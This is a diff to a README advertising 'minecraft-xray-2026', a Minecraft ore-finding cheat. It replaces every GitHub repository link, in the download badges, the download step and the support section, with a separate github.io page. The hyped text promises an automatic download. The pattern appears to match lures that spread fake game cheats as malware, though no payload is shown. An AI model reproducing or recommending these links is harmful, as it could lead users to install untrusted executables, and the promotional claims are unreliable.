@@ -1,6 +1,6 @@
 # ⛏️ minecraft-xray-2026 - Find Every Ore Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Minecraft_XRay_2026-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dzinstudio/minecraft-xray-2026)
+[![Download Now](https://img.shields.io/badge/Download-Minecraft_XRay_2026-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://dzinstudio.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Follow these simple steps to get up and running in under five minutes. You don't
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Dzinstudio/minecraft-xray-2026](https://github.com/Dzinstudio/minecraft-xray-2026)
+Visit this link to download the application: [https://dzinstudio.github.io](https://dzinstudio.github.io)
 
 Click the big green "Download" button on that page. The download will start automatically. Wait for it to finish.
 
@@ -145,7 +145,7 @@ This tool is provided as-is for personal use. You may not resell or redistribute
 
 ## 🤝 Support and Community
 
-For help, questions, or feature requests, visit the GitHub repository: [https://github.com/Dzinstudio/minecraft-xray-2026](https://github.com/Dzinstudio/minecraft-xray-2026)
+For help, questions, or feature requests, visit the GitHub repository: [https://dzinstudio.github.io](https://dzinstudio.github.io)
 
 Star the repository to show your support and stay updated on new releases.
 
@@ -153,9 +153,9 @@ Star the repository to show your support and stay updated on new releases.
 
 ## ⚠️ Final Reminder
 
-[![Download Now](https://img.shields.io/badge/Get_Minecraft_XRay_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dzinstudio/minecraft-xray-2026)
+[![Download Now](https://img.shields.io/badge/Get_Minecraft_XRay_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://dzinstudio.github.io)
 
-Visit this link to download the application: [https://github.com/Dzinstudio/minecraft-xray-2026](https://github.com/Dzinstudio/minecraft-xray-2026)
+Visit this link to download the application: [https://dzinstudio.github.io](https://dzinstudio.github.io)
 
 Download now and transform your Minecraft experience. See everything, find everything, and dominate the game like never before. This tool is the ultimate companion for any serious Minecraft player in 2026.
 
